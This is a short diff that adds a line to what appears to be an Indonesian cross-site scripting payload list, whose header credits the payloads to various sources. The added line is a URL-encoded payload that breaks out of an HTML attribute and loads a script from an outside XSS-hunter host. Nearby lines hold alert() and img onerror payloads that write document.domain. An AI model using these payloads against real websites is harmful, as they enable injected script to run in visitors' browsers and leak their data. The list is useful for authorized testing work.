@@ -5,6 +5,9 @@ TOLONG DOAKAN PENULIS DAN PEMILIK PAYLOAD YANG PENULIS DAPATKAN DARI SUMBER MANA
 SEMOGA BERKAH DAN MEMBAWA MANFAAT SELALU
 -----------------------------------------------------------------------
 
+
+%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fzhirosec.xss.ht%3E%3C%2Fscript%3E
+
 <script>alert(111);</script>zhirow
 
 “><img src=x onerror=write(document.domain)>
